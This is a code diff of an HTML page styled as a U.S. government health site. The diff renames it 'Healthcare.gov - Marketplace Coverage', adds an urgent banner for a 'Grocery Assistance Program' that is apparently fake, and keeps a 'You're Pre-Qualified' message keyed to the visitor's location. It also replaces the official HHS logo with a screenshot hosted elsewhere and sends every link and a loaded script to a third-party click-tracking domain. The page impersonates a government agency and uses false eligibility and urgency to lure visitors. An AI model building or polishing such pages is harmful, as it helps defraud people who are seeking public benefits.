@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>U.S. Department of Health & Human Services</title>
+    <title>Healthcare.gov - Marketplace Coverage</title>
     <script type="text/javascript" src="//hpkpn.ttrk.io/track.js"></script>
     <style>
         * {
@@ -24,90 +24,95 @@
             margin: 0 auto;
             padding: 0 20px;
         }
-
-        /* HHS Header */
-        .hhs-header {
-            background-color: #003058;
-            color: white;
-            padding: 20px 0;
-            text-align: left;
-        }
         
-        .hhs-header-content {
+        /* New Header Banner */
+        .hhs-header-banner {
+            background-color: #003366;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .hhs-header-banner-content {
             display: flex;
             align-items: center;
             justify-content: space-between;
         }
-        
         .hhs-logo-section {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 10px;
         }
-
         .hhs-logo {
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
         }
-
         .hhs-logo img {
             width: 100%;
             height: auto;
-            display: block;
         }
-        
         .hhs-title {
             font-size: 24px;
             font-weight: 700;
         }
-        
-        .hhs-nav-links {
-            display: none; /* Hidden on desktop to match the screenshot */
+        .hhs-search-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
         }
-        
         .hhs-search {
             position: relative;
         }
-        
         .hhs-search input {
+            padding: 6px 10px;
             border: none;
-            padding: 8px 12px;
             border-radius: 4px;
             font-size: 14px;
         }
-        
         .hhs-search button {
             background: none;
             border: none;
-            color: #555;
             position: absolute;
-            right: 8px;
+            right: 5px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
-        }
-
-        /* Secondary Navigation */
-        .hhs-secondary-nav {
-            background-color: #d9d9d9;
-            padding: 10px 0;
-            border-bottom: 1px solid #ccc;
+            color: #555;
         }
         
-        .hhs-secondary-nav ul {
-            list-style: none;
-            display: flex;
-            gap: 20px;
+        /* Yellow Alert Banner */
+        .alert-banner-yellow {
+            background-color: #ffdd57;
+            border-left: 4px solid #ffcc00;
+            padding: 15px 20px;
+            margin: 0 auto;
+            font-size: 16px;
+            font-weight: 600;
+            color: #4a4a4a;
+            text-align: center;
+        }
+
+        /* Navigation */
+        .navigation {
+            background-color: #fff;
+            border-bottom: 1px solid #d6d7d9;
+            padding: 15px 0;
+        }
+
+        .breadcrumb a {
+            color: #0071bc;
+            text-decoration: none;
             font-size: 14px;
         }
         
-        .hhs-secondary-nav a {
-            text-decoration: none;
-            color: #333;
-            font-weight: 600;
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        .breadcrumb span {
+            color: #5b616b;
         }
 
-        /* Main Content Layout */
+        /* Main Layout */
         .page-layout {
             display: flex;
             gap: 30px;
@@ -164,7 +169,7 @@
             color: #212529;
         }
         
-        /* Benefit Box */
+        /* Highlighted Benefit Box */
         .benefit-box {
             background-color: #ffc966;
             padding: 25px;
@@ -275,9 +280,36 @@
 
         /* Footer */
         .footer {
-            background-color: #003058;
+            background-color: #0d284a;
             color: white;
             padding: 40px 0;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footer-section h4 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: white;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section a {
+            color: #dce4ef;
+            text-decoration: none;
+            line-height: 2;
+            font-size: 14px;
+        }
+        .footer-section a:hover {
+            text-decoration: underline;
         }
 
         .footer-bottom {
@@ -287,51 +319,35 @@
             font-size: 13px;
             color: #ccc;
         }
-        
-        .footer-bottom a {
-            color: white;
-            text-decoration: none;
-            margin: 0 10px;
-        }
-        
-        @media (max-width: 768px) {
-            .page-layout {
-                flex-direction: column;
-            }
-            .hhs-header-content {
-                flex-direction: column;
-                text-align: center;
-                gap: 20px;
-            }
-        }
     </style>
 </head>
 <body>
 
-    <header class="hhs-header">
-        <div class="container hhs-header-content">
+    <header class="hhs-header-banner">
+        <div class="container hhs-header-banner-content">
             <div class="hhs-logo-section">
                 <a href="https://hpkpn.ttrk.io/click">
-                    <img src="https://www.hhs.gov/sites/all/themes/hhs/images/hhs-logo.svg" alt="HHS Logo" class="hhs-logo">
+                    <img src="https://res.cloudinary.com/dndik3mpf/image/upload/v1755900204/Screenshot_2025-08-22_at_2.48.48_PM_v2gpo0.png" alt="HHS Logo" class="hhs-logo">
                 </a>
-                <span class="hhs-title">U.S. Department of Health & Human Services</span>
+                <span class="hhs-title">Healthcare.gov - Marketplace Coverage</span>
             </div>
-            <div class="hhs-search">
-                <input type="text" placeholder="Search">
-                <button>🔍</button>
+            <div class="hhs-search-section">
+                <a href="#" style="color: white; font-size: 14px; text-decoration: none;">Language: English</a>
             </div>
         </div>
     </header>
 
-    <div class="hhs-secondary-nav">
+    <div class="alert-banner-yellow">
         <div class="container">
-            <ul>
-                <li><a href="https://hpkpn.ttrk.io/click">Home</a></li>
-                <li><a href="https://hpkpn.ttrk.io/click">Health</a></li>
-                <li><a href="https://hpkpn.ttrk.io/click">Human Services</a></li>
-                <li><a href="https://hpkpn.ttrk.io/click">News</a></li>
-                <li><a href="https://hpkpn.ttrk.io/click">About</a></li>
-            </ul>
+            NOTE: Limited enrollment period for 2025 Grocery Assistance Program ends soon. Complete your application today.
+        </div>
+    </div>
+
+    <div class="navigation">
+        <div class="container">
+            <div class="breadcrumb">
+                <a href="https://hpkpn.ttrk.io/click">Home</a> > <a href="https://hpkpn.ttrk.io/click">Benefits</a> > <span>Grocery Assistance Program</span>
+            </div>
         </div>
     </div>
     
@@ -343,7 +359,7 @@
                 <div class="status-icon">✓</div>
                 <div class="status-text">
                     <h3>You're Pre-Qualified</h3>
-                    <p>Based on your location in <span id="user-location">Las Vegas, Nevada</span>, you meet the initial requirements for this program.</p>
+                    <p>Based on your location in <span id="user-location"></span>, you meet the initial requirements for this program.</p>
                 </div>
             </div>
             
